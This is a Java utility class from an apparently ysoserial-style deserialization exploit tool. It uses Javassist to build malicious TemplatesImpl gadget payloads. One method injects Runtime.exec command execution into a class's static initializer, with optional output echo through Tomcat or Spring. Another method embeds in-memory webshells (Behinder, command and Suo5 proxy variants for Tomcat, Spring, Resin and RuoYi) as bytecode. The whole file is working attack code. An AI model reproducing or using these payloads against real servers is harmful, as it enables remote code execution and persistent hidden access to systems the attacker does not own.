package com.mechoy.utils;

import com.mechoy.bean.YsoGadgetBean;
import com.mechoy.memshell.resin.ResinListenerBehinder;
import com.mechoy.memshell.resin.ResinListenerCMD;
import com.mechoy.memshell.spring.SpringInterceptorBehinder;
import com.mechoy.memshell.suo5.Suo5SpringInterceptorProxy;
import com.mechoy.memshell.suo5.Suo5TomcatFilterProxy;
import com.mechoy.memshell.tomcat.TomcatListenerBehinder;
import com.mechoy.memshell.tomcat.TomcatListenerCMD;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.UUID;

public class TemplateUtils {
    /**
     * 执行命令，可控回显
     * 根据分支进行判断是否回显
     * 无回显状态下，直接Runtime.exec,回显状态下优先执行命令，然后再进行回显
     * @param common   需要执行的命令
     * @param echoType 回显的类型
     * @return 用于执行命令的template
     * @throws Exception
     */
    public static TemplatesImpl getCommandTemplate(String common, String echoType) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Class clazz = TemplatesImpl.class.newInstance().getClass();

        // 生成命令执行class数组
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("a" + replace);

        String cmd = "";
        if (echoType.equals("NoFeedback")) {
            cmd = "Runtime.getRuntime().exec(new String[]{" + cmdTo(common.split(" ")) + "});";
            //向静态代码块插入恶意代码，插入到构造函数也可以
            cc.makeClassInitializer().insertBefore(cmd);
        } else {
            // 对于回显方式不是null的，先执行命令，再进行回显
            cmd = "java.lang.StringBuilder output = new java.lang.StringBuilder();\n" +
                    "try {\n" +
                    "   java.lang.Process exec = Runtime.getRuntime().exec(new String[]{" + cmdTo(common.split(" ")) + "});\n" +
                    "   java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(exec.getInputStream()));\n" +
                    "   String line;\n" +
                    "   while ((line = reader.readLine()) != null) {\n" +
                    "       output.append(line).append(\"\\n\");\n" +
                    "   }\n" +
                    "   int exitCode = exec.waitFor();\n" +
                    "}catch (Exception e){\n" +
                    "   e.printStackTrace();\n" +
                    "}\n";
            //向静态代码块插入恶意代码，插入到构造函数也可以


            switch (echoType) {
                case "TomcatEcho":
                    EchoUtils.tomcatEcho(cc, cmd);
                    break;
                case "SpringEcho":
                    EchoUtils.springEcho(cc, cmd);
                    break;
            }
        }

        //需设置此项才能实现newinstance，具体原因请看defineTransletClasses和getTransletInstance源码
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.setName("A" + replace);

        // 用于检查生成的类
//        cc.writeFile("./output");
        byte[] evilbytes = cc.toBytecode();

        byte[][] targetByteCodes = new byte[][]{evilbytes};
        Field[] Fields = clazz.getDeclaredFields();
        for (Field Field : Fields) { //遍历Fields数组
            try {
                Field.setAccessible(true);  //对数组中的每一项实现私有访问
                if (Field.getName() == "_bytecodes") {
                    Field.set(templates, targetByteCodes);
                }
                if (Field.getName() == "_class") {
                    Field.set(templates, null);
                }
                if (Field.getName() == "_name") {
                    Field.set(templates, "abc");
                }
                if (Field.getName() == "_tfactory") {
                    Field.set(templates, new TemplatesImpl());
                }
            } catch (Exception e) {
            }
        }

        return templates;
    }

    /**
     * 获取注入内存马的Template
     *
     * @param ysoGadgetBean 传入一个Bean,其中所需参数均放在该javaBean中
     * @return 增加内存马的template
     * @throws Exception
     */
    public static TemplatesImpl getMemShellTemplate(YsoGadgetBean ysoGadgetBean) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Class clazz = TemplatesImpl.class.newInstance().getClass();

        byte[] evilbytes = null;

        switch (ysoGadgetBean.getMemShellType()) {
            case "TomcatListenerCMD":
                evilbytes = TomcatListenerCMD.generateListenerMemShell(ysoGadgetBean.getMemShellPass());
                break;
            case "TomcatListenerBehinder":
                evilbytes = TomcatListenerBehinder.generateListenerMemShell(ysoGadgetBean.getMemShellPass());
                break;
            case "SpringInterceptorBehinder":
                evilbytes = SpringInterceptorBehinder.generateListenerMemShell(ysoGadgetBean.getMenShellPath(), ysoGadgetBean.getMemShellPass());
                break;
            case "ResinListenerCMD":
                evilbytes = ResinListenerCMD.generateListenerMemShell(ysoGadgetBean.getMemShellPass());
                break;
            case "ResinListenerBehinder":
                evilbytes = ResinListenerBehinder.generateListenerMemShell(ysoGadgetBean.getMemShellPass());
                break;
            case "Suo5SpringInterceptorProxy":
                evilbytes = Suo5SpringInterceptorProxy.generateListenerMemShell(ysoGadgetBean.getMenShellPath(), ysoGadgetBean.getMemShellHeaderKey(), ysoGadgetBean.getMemShellHeaderValue());
                break;
            case "Suo5TomcatFilterProxy":
                evilbytes = Suo5TomcatFilterProxy.generateListenerMemShell(ysoGadgetBean.getMenShellPath(), ysoGadgetBean.getMemShellHeaderKey(), ysoGadgetBean.getMemShellHeaderValue());
                break;
            case "RuoYiSpringInterceptorBehinder":
                // 针对若依(springboot+springShiro这种类型的内存马)
                evilbytes = Suo5TomcatFilterProxy.generateListenerMemShell(ysoGadgetBean.getMenShellPath(), ysoGadgetBean.getMemShellHeaderKey(), ysoGadgetBean.getMemShellHeaderValue());
                break;
        }

        byte[][] targetByteCodes = new byte[][]{evilbytes};
        Field[] Fields = clazz.getDeclaredFields();
        for (Field Field : Fields) { //遍历Fields数组
            try {
                Field.setAccessible(true);  //对数组中的每一项实现私有访问
                if (Field.getName() == "_bytecodes") {
                    Field.set(templates, targetByteCodes);
                }
                if (Field.getName() == "_class") {
                    Field.set(templates, null);
                }
                if (Field.getName() == "_name") {
                    Field.set(templates, "abc");
                }
                if (Field.getName() == "_tfactory") {
                    Field.set(templates, new TemplatesImpl());
                }
            } catch (Exception e) {
            }
        }

        return templates;
    }

    /**
     * 预留的，用于生成空class的方法
     *
     * @return 空class的字符数组
     * @throws IOException
     * @throws CannotCompileException
     */
    public static byte[] nullClass() throws IOException, CannotCompileException {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "").substring(0, 7);

        ClassPool pool = ClassPool.getDefault();
        String className = "A" + replace;
        CtClass ctClass = pool.makeClass(className);
        return ctClass.toBytecode();
    }

    /**
     * 转换字节数组的输出格式为："11","22","33"
     *
     * @param split
     * @return
     */
    public static String cmdTo(String[] split) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < split.length; i++) {
            stringBuilder.append("\"");
            stringBuilder.append(split[i]);
            stringBuilder.append("\"");
            if (i == split.length - 1) {
                break;
            }
            stringBuilder.append(",");
        }

        return stringBuilder.toString();
    }


}
